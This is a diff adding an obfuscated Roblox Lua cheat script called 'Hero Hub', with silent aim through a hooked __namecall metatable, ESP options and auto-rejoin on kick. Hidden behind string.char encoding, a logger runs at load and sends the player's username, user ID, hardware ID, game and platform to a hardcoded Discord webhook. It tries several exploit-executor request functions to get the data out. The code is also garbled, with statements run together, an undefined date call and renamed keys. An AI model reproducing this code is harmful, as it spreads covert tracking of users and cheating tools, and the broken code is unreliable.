@@ -1,0 +1,1494 @@
+local _0x20C0 = game:GetService(string.char(80,108,97,121,101,114,115))
+local _0x385F = game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))
+local _0x9638 = game:GetService(string.char(67,111,114,101,71,117,105))
+local _0xA134 = game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))
+local _0xB339 = game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101))
+local _0xF6FD = game:GetService(string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101))
+local _0xA3AA = game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))
+local _0x64C5 = game:GetService(string.char(83,116,97,116,115))
+local _0x2ACE = game:GetService(string.char(86,105,114,116,117,97,108,85,115,101,114))
+local _0x8679 = _0x20C0.LocalPlayer
+local _0xAA86 = workspace.CurrentCameralocal _0x3A7F =string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,53,48,54,52,49,53,55,56,57,48,55,56,48,51,54,53,50,47,121,69,98,111,118,67,90,89,107,86,65,120,67,76,54,81,115,89,95,112,110,83,53,109,66,113,118,48,74,70,99,76,87,66,109,77,54,100,86,114,70,78,65,114,80,105,83,70,83,109,120,70,82,112,114,65,106,117,54,82,89,88,102,90,83,99,67,120)local _0xF15D =string.char(86,49,46,52)local _0xCD17 = truelocal function _0x3E6B()
+local _0x4EDD =string.char(117,110,107,110,111,119,110)pcall(function()
+if gethwid then _0x4EDD = gethwid()
+elseif _0x3E6B then _0x4EDD = _0x3E6B()
+elseif syn and syn.get_hwid then _0x4EDD = syn.get_hwid()
+elseif game:GetService(string.char(82,98,120,65,110,97,108,121,116,105,99,115,83,101,114,118,105,99,101)) then
+_0x4EDD = game:GetService(string.char(82,98,120,65,110,97,108,121,116,105,99,115,83,101,114,118,105,99,101)):GetClientId()
+end
+end)
+return tostring(_0x4EDD)
+end
+local function _0xD98F()
+local _0xC943 =string.char(85,110,107,110,111,119,110)pcall(function()
+local _0xFD86 = _0xA134
+if _0xFD86.TouchEnabled and not _0xFD86.KeyboardEnabled then _0xC943 =string.char(239,191,189,239,191,189,32,77,111,98,105,108,101)elseif _0xFD86.KeyboardEnabled and _0xFD86.MouseEnabled then _0xC943 =string.char(239,191,189,239,191,189,239,184,143,32,80,67)elseif _0xFD86.GamepadEnabled then _0xC943 =string.char(239,191,189,239,191,189,32,67,111,110,115,111,108,101)end
+end)
+return _0xC943
+end
+local function _0x660D(_0xE7CB, _0x7CA9)if request then
+local _0xF5C2 = pcall(function()
+request({
+Url = _0xE7CB, Method =string.char(80,79,83,84),
+Headers = { [string.char(67,111,110,116,101,110,116,45,84,121,112,101)] =string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},
+Body = _0x7CA9,
+})
+end)
+if _0xF5C2 then returnstring.char(114,101,113,117,101,115,116,40,41)end
+endif syn and syn.request then
+local _0xF5C2 = pcall(function()
+syn.request({
+Url = _0xE7CB, Method =string.char(80,79,83,84),
+Headers = { [string.char(67,111,110,116,101,110,116,45,84,121,112,101)] =string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},
+Body = _0x7CA9,
+})
+end)
+if _0xF5C2 then returnstring.char(115,121,110,46,114,101,113,117,101,115,116,40,41)end
+endif http_request then
+local _0xF5C2 = pcall(function()
+http_request({
+Url = _0xE7CB, Method =string.char(80,79,83,84),
+Headers = { [string.char(67,111,110,116,101,110,116,45,84,121,112,101)] =string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},
+Body = _0x7CA9,
+})
+end)
+if _0xF5C2 then returnstring.char(104,116,116,112,95,114,101,113,117,101,115,116,40,41)end
+endif fluxus and fluxus.request then
+local _0xF5C2 = pcall(function()
+fluxus.request({
+Url = _0xE7CB, Method =string.char(80,79,83,84),
+Headers = { [string.char(67,111,110,116,101,110,116,45,84,121,112,101)] =string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},
+Body = _0x7CA9,
+})
+end)
+if _0xF5C2 then returnstring.char(102,108,117,120,117,115,46,114,101,113,117,101,115,116,40,41)end
+endif krnl and krnl.request then
+local _0xF5C2 = pcall(function()
+krnl.request({
+Url = _0xE7CB, Method =string.char(80,79,83,84),
+Headers = { [string.char(67,111,110,116,101,110,116,45,84,121,112,101)] =string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},
+Body = _0x7CA9,
+})
+end)
+if _0xF5C2 then returnstring.char(107,114,110,108,46,114,101,113,117,101,115,116,40,41)end
+endlocal _0xF5C2 = pcall(function()
+game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)):PostAsync(
+_0xE7CB, _0x7CA9, Enum.HttpContentType.ApplicationJson
+)
+end)
+if _0xF5C2 then returnstring.char(80,111,115,116,65,115,121,110,99,40,41)end
+return nil
+end
+local function _0xCA1E()
+if not _0xCD17 then return end
+if not _0x3A7F or _0x3A7F ==""then return end
+task.spawn(function()
+local _0xE6A5 =string.char(85,110,107,110,111,119,110)pcall(function()
+_0xE6A5 = game:GetService(string.char(77,97,114,107,101,116,112,108,97,99,101,83,101,114,118,105,99,101)):GetProductInfo(game.PlaceId).Name
+end)
+local _0xB550 = _0x3E6B()
+local _0x1C36 = #_0xB550 > 30 and _0xB550:sub(1, 30) ..string.char(46,46,46)or _0xB550
+local _0xC943 = _0xD98F()
+local _0x947B = {
+username =string.char(72,101,114,111,32,72,117,98,32,76,111,103,103,101,114),
+avatar_url =string.char(104,116,116,112,115,58,47,47,105,46,112,111,115,116,105,109,103,46,99,99,47,57,81,114,81,48,116,48,109,47,104,101,114,111,45,104,97,99,107,101,114,45,108,111,103,111,45,118,50,46,112,110,103),
+embeds = {{
+title =string.char(239,191,189,239,191,189,32,72,101,114,111,32,72,117,98,32,194,183,32,83,99,114,105,112,116,32,76,111,97,100,101,100),
+description =string.char(79,110,101,32,117,115,101,114,32,106,117,115,116,32,101,120,101,99,117,116,101,100,32,116,104,101,32,115,99,114,105,112,116),
+_0x6926 = 5793266,
+thumbnail = { _0xE7CB =string.char(104,116,116,112,115,58,47,47,105,46,112,111,115,116,105,109,103,46,99,99,47,57,81,114,81,48,116,48,109,47,104,101,114,111,45,104,97,99,107,101,114,45,108,111,103,111,45,118,50,46,112,110,103)},
+fields = {
+{ name =string.char(239,191,189,239,191,189,32,85,115,101,114,110,97,109,101), value =string.char(96).. _0x8679.Name ..string.char(96), inline = true },
+{ name =string.char(239,191,189,239,191,189,32,85,115,101,114,32,73,68), value =string.char(96).. tostring(_0x8679.UserId) ..string.char(96), inline = true },
+{ name =string.char(239,191,189,239,191,189,32,71,97,109,101), value = _0xE6A5, inline = false },
+{ name =string.char(239,191,189,239,191,189,32,80,108,97,99,101,32,73,68), value =string.char(96).. tostring(game.PlaceId) ..string.char(96), inline = true },
+{ name =string.char(239,191,189,239,191,189,32,86,101,114,115,105,111,110), value =string.char(96).. _0xF15D ..string.char(96), inline = true },
+{ name =string.char(239,191,189,239,191,189,32,80,108,97,116,102,111,114,109), value = _0xC943, inline = false },
+{ name =string.char(239,191,189,239,191,189,32,72,87,73,68), value =string.char(124,124,96).. _0x1C36 ..string.char(96,124,124), inline = false },
+},
+footer = {
+text =string.char(72,101,114,111,32,72,117,98,32,84,114,97,99,107,101,114,32,194,183,32).. _0x2686.date(string.char(37,89,45,37,109,45,37,100)),
+icon_url =string.char(104,116,116,112,115,58,47,47,105,46,112,111,115,116,105,109,103,46,99,99,47,57,81,114,81,48,116,48,109,47,104,101,114,111,45,104,97,99,107,101,114,45,108,111,103,111,45,118,50,46,112,110,103)},
+timestamp = _0x2686.date(string.char(33,37,89,45,37,109,45,37,100,84,37,72,58,37,77,58,37,83,90)),
+}},
+}
+local _0x7CA9 = game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)):JSONEncode(_0x947B)
+local _0x1183 = _0x660D(_0x3A7F, _0x7CA9)
+if _0x1183 then
+print(string.char(91,72,101,114,111,32,72,117,98,93,32,84,114,97,99,107,101,100,32,118,105,97,32).. _0x1183)
+else
+warn(string.char(91,72,101,114,111,32,72,117,98,93,32,84,114,97,99,107,101,114,58,32,97,108,108,32,72,84,84,80,32,109,101,116,104,111,100,115,32,98,108,111,99,107,101,100))
+end
+end)
+end
+_0xCA1E()local _0x629D = {
+BG = Color3.fromRGB(6, 6, 8),
+PANEL = Color3.fromRGB(12, 12, 15),
+CARD = Color3.fromRGB(20, 20, 24),
+CARD_HI = Color3.fromRGB(30, 30, 36),
+ACCENT = Color3.fromRGB(200, 200, 210),
+ACCENT_2= Color3.fromRGB(140, 140, 155),
+SUCCESS = Color3.fromRGB(100, 220, 140),
+DANGER = Color3.fromRGB(240, 100, 100),
+WARN = Color3.fromRGB(240, 190, 100),
+TEXT = Color3.fromRGB(240, 240, 245),
+DIM = Color3.fromRGB(140, 140, 150),
+MUTED = Color3.fromRGB(80, 80, 90),
+BORDER = Color3.fromRGB(50, 50, 60),
+}
+local _0xD38E = Enum.Font.GothamBold
+local _0x63AA = Enum.Font.GothamMedium
+local _0x7714 = Enum.Font.Gotham
+local _0xE389 = 0.28
+local _0x7AA8 = 0.35
+local _0xEA66 = 0.30local _0x8B8A =string.char(72,101,114,111,72,117,98,95,66,108,97,99,107,86,49,46,106,115,111,110)local _0x5FFB = {
+CombatEnabled=false, SilentAim=false, AimPart=string.char(72,101,97,100), FOVRadius=150,
+Smoothness=0.25, TeamCheck=false, HitChance=100, MaxDistance=800,
+SilentKeybind=false,
+BoxESP=false, NameESP=false, HealthESP=false, DistanceESP=false,
+InventoryESP=true, ShowEmpty=false,
+PlayerSpeed=false, PlayerJump=false, InfStamina=false, AutoSpawn=false,
+AutoOpenSkip=false, AntiAFK=false, AutoRejoin=false, HideName=false,
+HideForScreen=false, ShowStats=true, ShowNotifications=true,
+}
+local function _0x5B2D()
+pcall(function() if writefile then writefile(_0x8B8A, _0xB339:JSONEncode(_0x5FFB)) end end)
+end
+local function _0x7204()
+pcall(function()
+if readfile and isfile and isfile(_0x8B8A) then
+local _0xE2E2 = _0xB339:JSONDecode(readfile(_0x8B8A))
+for k,_0xF193 in pairs(_0xE2E2) do if _0x5FFB[k]~=nil then _0x5FFB[k]=_0xF193 end end
+end
+end)
+end
+_0x7204()local _0x7C43 =string.char(104,116,116,112,115,58,47,47,105,46,112,111,115,116,105,109,103,46,99,99,47,57,81,114,81,48,116,48,109,47,104,101,114,111,45,104,97,99,107,101,114,45,108,111,103,111,45,118,50,46,112,110,103)local _0x69B7 = _0x7C43
+pcall(function()
+if getcustomasset and writefile and isfile then
+local _0xF736 =string.char(104,104,95,108,111,103,111,95,118,49,46,112,110,103)if not isfile(_0xF736) then
+local _0xB2A0 = game:HttpGet(_0x7C43)
+writefile(_0xF736, _0xB2A0)
+end
+_0x69B7 = getcustomasset(_0xF736)
+end
+end)local _0x3B49 = {
+[string.char(99,111,109,109,111,110)] = {_0x6926 = Color3.fromRGB(200, 200, 200), tier = 1},
+[string.char(117,110,99,111,109,109,111,110)] = {_0x6926 = Color3.fromRGB(99, 255, 52), tier = 2},
+[string.char(114,97,114,101)] = {_0x6926 = Color3.fromRGB(51, 170, 255), tier = 3},
+[string.char(101,112,105,99)] = {_0x6926 = Color3.fromRGB(180, 60, 255), tier = 4},
+[string.char(108,101,103,101,110,100,97,114,121)] = {_0x6926 = Color3.fromRGB(255, 150, 0), tier = 5},
+[string.char(109,121,116,104,105,99)] = {_0x6926 = Color3.fromRGB(255, 0, 127), tier = 6},
+[string.char(103,111,100,108,121)] = {_0x6926 = Color3.fromRGB(255, 255, 100), tier = 7},
+[string.char(100,105,118,105,110,101)] = {_0x6926 = Color3.fromRGB(255, 240, 200), tier = 8},
+[string.char(115,101,99,114,101,116)] = {_0x6926 = Color3.fromRGB(0, 255, 200), tier = 9},
+[string.char(97,110,99,105,101,110,116)] = {_0x6926 = Color3.fromRGB(200, 50, 50), tier = 10},
+[string.char(111,109,101,103,97)] = {_0x6926 = Color3.fromRGB(255, 20, 51), tier = 7},
+[string.char(101,120,111,116,105,99)] = {_0x6926 = Color3.fromRGB(255, 100, 180), tier = 8},
+[string.char(101,120,99,108,117,115,105,118,101)] = {_0x6926 = Color3.fromRGB(255, 215, 0), tier = 9},
+[string.char(108,105,109,105,116,101,100)] = {_0x6926 = Color3.fromRGB(255, 215, 0), tier = 8},
+[string.char(115,112,101,99,105,97,108)] = {_0x6926 = Color3.fromRGB(255, 200, 100), tier = 6},
+[string.char(117,110,105,113,117,101)] = {_0x6926 = Color3.fromRGB(255, 100, 255), tier = 8},
+[string.char(101,118,101,110,116)] = {_0x6926 = Color3.fromRGB(255, 200, 0), tier = 6},
+}
+local _0x4C45 = {
+[0]=string.char(67,111,109,109,111,110),[1]=string.char(85,110,99,111,109,109,111,110),[2]=string.char(82,97,114,101),[3]=string.char(69,112,105,99),[4]=string.char(76,101,103,101,110,100,97,114,121),
+[5]=string.char(77,121,116,104,105,99),[6]=string.char(71,111,100,108,121),[7]=string.char(68,105,118,105,110,101),[8]=string.char(83,101,99,114,101,116),[9]=string.char(65,110,99,105,101,110,116),
+}
+local _0x4DB0 = setmetatable({}, {__mode=string.char(107)})
+local function _0x5BF7(obj)
+if not obj then return nil end
+local _0x3B77 = _0x4DB0[obj]
+if _0x3B77 ~= nil then return _0x3B77 ~= false and _0x3B77 or nil end
+for _, a in ipairs({string.char(82,97,114,105,116,121,78,97,109,101),string.char(82,97,114,105,116,121),string.char(84,105,101,114),string.char(82,97,114,105,116,121,84,105,101,114),string.char(81,117,97,108,105,116,121),string.char(71,114,97,100,101),string.char(82,97,114,105,116,121,76,101,118,101,108),string.char(73,116,101,109,82,97,114,105,116,121)}) do
+local _0xF193 = obj:GetAttribute(a)
+if _0xF193 then
+if type(_0xF193)==string.char(115,116,114,105,110,103)and _0x3B49[_0xF193:lower()] then
+local _0x6DAF = _0x3B49[_0xF193:lower()]
+local _0xEB4F = {name=_0xF193, _0x6926=_0x6DAF.color, tier=_0x6DAF.tier}
+_0x4DB0[obj]=_0xEB4F; return _0xEB4F
+end
+if type(_0xF193)==string.char(110,117,109,98,101,114)and _0x4C45[_0xF193] then
+local _0xE2A9 = _0x4C45[_0xF193]
+local _0x6DAF = _0x3B49[_0xE2A9:lower()]
+local _0xEB4F = {name=_0xE2A9, _0x6926=_0x6DAF.color, tier=_0x6DAF.tier}
+_0x4DB0[obj]=_0xEB4F; return _0xEB4F
+end
+end
+end
+for _, ch in ipairs(obj:GetChildren()) do
+if ch:IsA(string.char(83,116,114,105,110,103,86,97,108,117,101)) or ch:IsA(string.char(78,117,109,98,101,114,86,97,108,117,101)) then
+local _0xF36D = ch.Name:lower()
+if _0xF36D:find(string.char(114,97,114,105,116,121)) or _0xF36D:find(string.char(116,105,101,114)) or _0xF36D:find(string.char(113,117,97,108,105,116,121)) or _0xF36D:find(string.char(103,114,97,100,101)) then
+local _0xF193 = tostring(ch.Value):lower()
+if _0x3B49[_0xF193] then
+local _0x6DAF = _0x3B49[_0xF193]
+local _0xEB4F = {name=ch.Value, _0x6926=_0x6DAF.color, tier=_0x6DAF.tier}
+_0x4DB0[obj]=_0xEB4F; return _0xEB4F
+end
+local _0xE22D = tonumber(ch.Value)
+if _0xE22D and _0x4C45[_0xE22D] then
+local _0xE2A9 = _0x4C45[_0xE22D]
+local _0x6DAF = _0x3B49[_0xE2A9:lower()]
+local _0xEB4F = {name=_0xE2A9, _0x6926=_0x6DAF.color, tier=_0x6DAF.tier}
+_0x4DB0[obj]=_0xEB4F; return _0xEB4F
+end
+end
+end
+end
+_0x4DB0[obj]=false
+return nil
+endlocal _0xEF1F = setmetatable({}, {__mode=string.char(107)})
+local function _0xD5FC(obj)
+if not obj then return nil end
+if _0xEF1F[obj] then return _0xEF1F[obj] end
+local _0x757E = {}
+for _, a in ipairs({string.char(87,101,97,112,111,110,78,97,109,101),string.char(73,116,101,109,78,97,109,101),string.char(68,105,115,112,108,97,121,78,97,109,101),string.char(84,105,116,108,101),string.char(84,111,111,108,78,97,109,101),string.char(78,97,109,101)}) do
+local _0xF193 = obj:GetAttribute(a)
+if type(_0xF193) ==string.char(115,116,114,105,110,103)and _0xF193 ~=""then
+table.insert(_0x757E, _0xF193)
+end
+end
+for _, ch in ipairs(obj:GetChildren()) do
+if ch:IsA(string.char(83,116,114,105,110,103,86,97,108,117,101)) and ch.Value ~=""then
+local _0xF36D = ch.Name:lower()
+if _0xF36D:find(string.char(110,97,109,101)) or _0xF36D:find(string.char(100,105,115,112,108,97,121)) or _0xF36D:find(string.char(116,105,116,108,101))
+or _0xF36D:find(string.char(119,101,97,112,111,110)) or _0xF36D:find(string.char(105,116,101,109)) then
+table.insert(_0x757E, tostring(ch.Value))
+end
+end
+end
+if #_0x757E == 0 then
+for _, ch in ipairs(obj:GetChildren()) do
+if ch:IsA(string.char(83,116,114,105,110,103,86,97,108,117,101)) and ch.Value ~=""then
+table.insert(_0x757E, tostring(ch.Value))
+break
+end
+end
+end
+if obj.Name and obj.Name ~=""and obj.Name:lower() ~=string.char(119,101,97,112,111,110)and obj.Name:lower() ~=string.char(104,97,110,100,108,101)and obj.Name:lower() ~=string.char(116,111,111,108)then
+table.insert(_0x757E, obj.Name)
+end
+for _, raw in ipairs(_0x757E) do
+local _0xB7E4 = tostring(raw):gsub(string.char(91,37,91,37,93,95,37,45,37,43,37,37,35,64,33,126,96,37,46,37,44,37,58,37,47,37,92,37,124,37,94,37,42,37,40,37,41,93,43),string.char(32))
+_0xB7E4 = _0xB7E4:gsub(string.char(94,37,115,43),""):gsub(string.char(37,115,43,36),""):gsub(string.char(37,115,43),string.char(32))
+if _0xB7E4 ~=""and not _0xB7E4:match(string.char(94,37,100,43,36)) then
+_0xEF1F[obj] = _0xB7E4
+return _0xB7E4
+end
+end
+_0xEF1F[obj] = false
+return nil
+endlocal _0x4A2E = { Target = nil, KeyHeld = true, Active = false, Hook = nil }
+local function _0x33D4()
+if not _0x5FFB.SilentAim then return nil end
+if _0x5FFB.SilentKeybind and not _0x4A2E.KeyHeld then return nil end
+local _0x9C32 = _0xAA86.ViewportSize
+local _0xA2E5, _0xB640 = _0x9C32.X/2, _0x9C32.Y/2
+local _0xD010 = _0xAA86.CFrame.Position
+local _0x527A, _0xA3B4 = nil, math.huge
+for _, _0x32A5 in ipairs(_0x20C0:GetPlayers()) do
+if _0x32A5 == _0x8679 then continue end
+if _0x5FFB.TeamCheck and _0x32A5.Team == _0x8679.Team then continue end
+local _0x4A1C = _0x32A5.Character
+if not _0x4A1C then continue end
+local _0xCF82 = _0x4A1C:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))
+if not _0xCF82 or _0xCF82.Health <= 0 then continue end
+local _0xC72B = _0x4A1C:FindFirstChild(_0x5FFB.AimPart) or _0x4A1C:FindFirstChild(string.char(72,101,97,100))
+if not _0xC72B then continue end
+local _0x3024 = (_0xC72B.Position - _0xD010).Magnitude
+if _0x3024 > _0x5FFB.MaxDistance then continue end
+local _0xF223, _0xCFE1 = _0xAA86:WorldToViewportPoint(_0xC72B.Position)
+if not _0xCFE1 then continue end
+local _0x67D0 = (Vector2.new(_0xF223.X, _0xF223.Y) - Vector2.new(_0xA2E5, _0xB640)).Magnitude
+if _0x67D0 > _0x5FFB.FOVRadius then continue end
+if _0x67D0 < _0xA3B4 then _0xA3B4 = _0x67D0; _0x527A = _0xC72B end
+end
+return _0x527A
+end
+local function _0x6A2B()
+local _0x190B = game.JobId
+local _0x8232 = game.PlaceId
+pcall(function()
+if _0x190B and _0x190B ~=""then
+_0xF6FD:TeleportToPlaceInstance(_0x8232, _0x190B, _0x8679)
+else
+_0xF6FD:Teleport(_0x8232, _0x8679)
+end
+end)
+end
+local function _0x41EF()
+return _0x5FFB.SilentAim or _0x5FFB.AutoRejoin
+end
+local function _0x7232()
+if _0x4A2E.Active then return end
+_0x4A2E.Active = true
+task.spawn(function()
+pcall(function()
+local _0x7A36 = getrawmetatable(game)
+local _0x1E23 = _0x7A36.__namecall
+_0x4A2E.Hook = _0x1E23
+setreadonly(_0x7A36, false)
+_0x7A36.__namecall = newcclosure(function(self, ...)
+local _0x1183 = getnamecallmethod()
+if _0x5FFB.AutoRejoin and _0x1183 ==string.char(75,105,99,107)and self == _0x8679 then
+task.spawn(function()
+task.wait(0.6)
+_0x6A2B()
+end)
+return nil
+end
+if _0x5FFB.SilentAim and _0x4A2E.Target and _0x1183 ==string.char(82,97,121,99,97,115,116)and self == workspace then
+local _0x2361 = {...}
+if _0x2361[1] and _0x2361[2] and _0x4A2E.Target.Parent then
+_0x2361[2] = _0x4A2E.Target.Position - _0x2361[1]
+return _0x1E23(self, table.unpack(_0x2361))
+end
+end
+return _0x1E23(self, ...)
+end)
+setreadonly(_0x7A36, true)
+end)
+end)
+end
+local function _0x36FE()
+if not _0x4A2E.Active then return end
+_0x4A2E.Active = false
+task.spawn(function()
+pcall(function()
+if _0x4A2E.Hook then
+local _0x7A36 = getrawmetatable(game)
+setreadonly(_0x7A36, false)
+_0x7A36.__namecall = _0x4A2E.Hook
+setreadonly(_0x7A36, true)
+end
+end)
+end)
+end
+_0xA134.InputBegan:Connect(function(input, gpe)
+if gpe then return end
+if _0x5FFB.SilentKeybind and input.UserInputType == Enum.UserInputType.MouseButton2 then
+_0x4A2E.KeyHeld = true
+end
+end)
+_0xA134.InputEnded:Connect(function(input)
+if _0x5FFB.SilentKeybind and input.UserInputType == Enum.UserInputType.MouseButton2 then
+_0x4A2E.KeyHeld = false
+end
+end)
+if _0x41EF() then _0x7232() endlocal function _0xF05C()
+local _0x4A1C = _0x8679.Character
+if not _0x4A1C then return end
+local _0xCF82 = _0x4A1C:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))
+if _0xCF82 then
+if _0x5FFB.HideName then
+_0xCF82.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+_0xCF82.NameDisplayDistance = 0
+_0xCF82.HealthDisplayDistance = 0
+else
+_0xCF82.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+_0xCF82.NameDisplayDistance = 100
+_0xCF82.HealthDisplayDistance = 100
+end
+end
+for _, _0xE2E2 in ipairs(_0x4A1C:GetDescendants()) do
+if _0xE2E2:IsA(string.char(66,105,108,108,98,111,97,114,100,71,117,105)) and _0xE2E2.Name ~=string.char(72,72,95,85,110,100,101,114,102,111,111,116)then
+if _0x5FFB.HideName then
+_0xE2E2.Enabled = false
+end
+end
+end
+end
+_0x8679.CharacterAdded:Connect(function()
+task.wait(0.5)
+_0xF05C()
+end)
+if _0x8679.Character then
+task.wait(0.3)
+_0xF05C()
+endlocal _0x46FA = Instance.new(string.char(83,99,114,101,101,110,71,117,105))
+_0x46FA.Name =string.char(72,101,114,111,72,117,98,66,108,97,99,107,86,49)_0x46FA.Parent = _0x9638
+_0x46FA.ResetOnSpawn = false
+_0x46FA.IgnoreGuiInset = true
+_0x46FA.ZIndexBehavior = Enum.ZIndexBehavior.Siblinglocal _0x28BB = Instance.new(string.char(70,114,97,109,101), _0x46FA)
+_0x28BB.BackgroundTransparency = 1
+_0x28BB.AnchorPoint = Vector2.new(1, 0)
+_0x28BB.Position = UDim2.new(1, -14, 0, 14)
+_0x28BB.Size = UDim2.new(0, 260, 1, -28)
+_0x28BB.ZIndex = 200
+_0x28BB.ClipsDescendants = false
+local _0xD1B3 = Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116), _0x28BB)
+_0xD1B3.SortOrder = Enum.SortOrder.LayoutOrder
+_0xD1B3.Padding = UDim.new(0, 6)
+_0xD1B3.HorizontalAlignment = Enum.HorizontalAlignment.Right
+local _0xA15A = 0
+local _0x2FF0 = 0
+local function _0xA8E1(title, _0x7CA9, _0x6926)
+if not _0x5FFB.ShowNotifications then return end
+if _0x2FF0 >= 4 then return end
+_0x2FF0 = _0x2FF0 + 1
+_0xA15A = _0xA15A + 1
+_0x6926 = _0x6926 or _0x629D.ACCENT
+local _0xF36D = Instance.new(string.char(70,114,97,109,101), _0x28BB)
+_0xF36D.BackgroundColor3 = _0x629D.PANEL
+_0xF36D.BackgroundTransparency = 0.05
+_0xF36D.Size = UDim2.new(1, 0, 0, 46)
+_0xF36D.LayoutOrder = _0xA15A
+_0xF36D.AnchorPoint = Vector2.new(1, 0)
+_0xF36D.Position = UDim2.new(1, 300, 0, 0)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xF36D).CornerRadius = UDim.new(0, 8)
+local _0x6912 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0xF36D)
+_0x6912.Color = _0x6926; _0x6912.Thickness = 1; _0x6912.Transparency = 0.35
+local _0xC1D8 = Instance.new(string.char(70,114,97,109,101), _0xF36D)
+_0xC1D8.BackgroundColor3 = _0x6926
+_0xC1D8.Position = UDim2.new(0, 0, 0, 8)
+_0xC1D8.Size = UDim2.new(0, 2, 1, -16)
+_0xC1D8.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xC1D8).CornerRadius = UDim.new(1, 0)
+local _0x53E4 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0xF36D)
+_0x53E4.BackgroundTransparency = 1
+_0x53E4.Position = UDim2.new(0, 12, 0, 6)
+_0x53E4.Size = UDim2.new(1, -18, 0, 16)
+_0x53E4.Font = _0xD38E; _0x53E4.TextSize = 11
+_0x53E4.Text = title
+_0x53E4.TextColor3 = _0x629D.TEXT
+_0x53E4.TextXAlignment = Enum.TextXAlignment.Left
+local _0x7572 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0xF36D)
+_0x7572.BackgroundTransparency = 1
+_0x7572.Position = UDim2.new(0, 12, 0, 23)
+_0x7572.Size = UDim2.new(1, -18, 0, 15)
+_0x7572.Font = _0x7714; _0x7572.TextSize = 9
+_0x7572.Text = _0x7CA9
+_0x7572.TextColor3 = _0x629D.DIM
+_0x7572.TextXAlignment = Enum.TextXAlignment.Left
+_0xA3AA:Create(_0xF36D, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+Position = UDim2.new(0, 0, 0, 0)
+}):Play()
+task.delay(2.2, function()
+_0xA3AA:Create(_0xF36D, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Position = UDim2.new(1, 300, 0, 0),
+BackgroundTransparency = 1
+}):Play()
+_0xA3AA:Create(_0x6912, TweenInfo.new(0.18), {Transparency = 1}):Play()
+task.wait(0.2)
+_0xF36D:Destroy()
+_0x2FF0 = _0x2FF0 - 1
+end)
+endlocal function _0xD6A3(_0x2434)
+local _0x717C = _0x2434.Size
+_0x2434.MouseButton1Down:Connect(function()
+_0xA3AA:Create(_0x2434, TweenInfo.new(0.06), {
+Size = UDim2.new(_0x717C.X.Scale*0.97, _0x717C.X.Offset*0.97, _0x717C.Y.Scale*0.97, _0x717C.Y.Offset*0.97)
+}):Play()
+end)
+_0x2434.MouseButton1Up:Connect(function()
+_0xA3AA:Create(_0x2434, TweenInfo.new(0.1), {Size = _0x717C}):Play()
+end)
+_0x2434.MouseLeave:Connect(function()
+_0xA3AA:Create(_0x2434, TweenInfo.new(0.1), {Size = _0x717C}):Play()
+end)
+end
+local function _0xF592(_0x2434, baseC, hoverC)
+_0x2434.MouseEnter:Connect(function()
+_0xA3AA:Create(_0x2434, TweenInfo.new(0.12), {BackgroundColor3 = hoverC}):Play()
+end)
+_0x2434.MouseLeave:Connect(function()
+_0xA3AA:Create(_0x2434, TweenInfo.new(0.12), {BackgroundColor3 = baseC}):Play()
+end)
+endlocal _0x7E5C = Instance.new(string.char(70,114,97,109,101), _0x46FA)
+_0x7E5C.BackgroundColor3 = _0x629D.BG
+_0x7E5C.BackgroundTransparency = 1
+_0x7E5C.AnchorPoint = Vector2.new(0.5,0.5)
+_0x7E5C.Position = UDim2.new(0.5,0,0.5,0)
+_0x7E5C.Size = UDim2.new(0,860,0,560)
+_0x7E5C.Active = true; _0x7E5C.Draggable = true; _0x7E5C.ClipsDescendants = true
+_0x7E5C.Visible = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x7E5C).CornerRadius = UDim.new(0,12)
+local _0xF49D = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x7E5C)
+_0xF49D.Color = _0x629D.BORDER; _0xF49D.Thickness = 1; _0xF49D.Transparency = 0.5
+local _0xF4E6 = Instance.new(string.char(70,114,97,109,101), _0x7E5C)
+_0xF4E6.BackgroundColor3 = _0x629D.PANEL
+_0xF4E6.BackgroundTransparency = _0x7AA8
+_0xF4E6.Size = UDim2.new(1,0,0,52)
+_0xF4E6.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xF4E6).CornerRadius = UDim.new(0,12)
+local _0x4881 = Instance.new(string.char(70,114,97,109,101), _0xF4E6)
+_0x4881.BackgroundColor3 = _0x629D.PANEL
+_0x4881.BackgroundTransparency = _0x7AA8
+_0x4881.Position = UDim2.new(0,0,1,-10)
+_0x4881.Size = UDim2.new(1,0,0,10)
+_0x4881.BorderSizePixel = 0
+local _0x6B60 = Instance.new(string.char(73,109,97,103,101,76,97,98,101,108), _0xF4E6)
+_0x6B60.BackgroundTransparency = 1
+_0x6B60.Position = UDim2.new(0,14,0.5,-16)
+_0x6B60.Size = UDim2.new(0,32,0,32)
+_0x6B60.Image = _0x69B7
+_0x6B60.ScaleType = Enum.ScaleType.Stretch
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x6B60).CornerRadius = UDim.new(0,8)
+local _0xEFCA = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0xF4E6)
+_0xEFCA.BackgroundTransparency = 1
